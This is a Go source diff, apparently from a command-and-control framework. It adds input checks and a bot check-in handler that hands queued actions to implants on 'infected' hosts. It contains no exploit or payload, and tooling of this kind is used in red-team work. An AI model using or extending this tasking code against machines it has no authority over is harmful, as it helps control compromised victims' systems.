@@ -2,10 +2,10 @@ package main
 
 import (
 	"github.com/degenerat3/meteor/meteor/core/ent/action"
-	"github.com/degenerat3/meteor/meteor/pbuf"
-	//"github.com/degenerat3/meteor/meteor/core/ent/bot"
+	"github.com/degenerat3/meteor/meteor/core/ent/bot"
 	"github.com/degenerat3/meteor/meteor/core/ent/group"
 	"github.com/degenerat3/meteor/meteor/core/ent/host"
+	"github.com/degenerat3/meteor/meteor/pbuf"
 	goUUID "github.com/google/uuid"
 )
 
@@ -175,6 +175,10 @@ func addResultUtil(prot *mcs.MCS) int32 {
 	uuid := prot.GetUuid()
 	res := prot.GetResult()
 
+	if uuid == "" || res == "" {
+		return 400 // missing param
+	}
+
 	actObj, err := DBClient.Action.Query().Where(action.UUID(uuid)).Only(ctx)
 
 	_, err = actObj.
@@ -187,6 +191,39 @@ func addResultUtil(prot *mcs.MCS) int32 {
 	}
 	return 200
 
+}
+
+func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
+	var actList []*mcs.Action
+	uuid := prot.GetUuid()
+	if uuid == "" {
+		return 400, actList // missing param
+	}
+	botObj, err := DBClient.Bot.Query().Where(bot.UUID(uuid)).Only(ctx)
+	if err != nil {
+		return 400, actList // unknown bot
+	}
+	hostObj, err := botObj.QueryInfecting().Only(ctx)
+	if err != nil {
+		return 400, actList // bot assoc w/ unknown host
+	}
+	acts, err := hostObj.QueryActions().All(ctx)
+	if err != nil {
+		return 500, actList // issue querying actions
+	}
+	for _, actn := range acts {
+		aUUID := actn.UUID
+		aMode := actn.Mode
+		aArgs := actn.Args
+		actn.Update().SetQueued(true).Save(ctx)
+		actProto := &mcs.Action{
+			Uuid: aUUID,
+			Mode: aMode,
+			Args: aArgs,
+		}
+		actList = append(actList, actProto)
+	}
+	return 200, actList
 }
 
 func listBotsUtil() string {
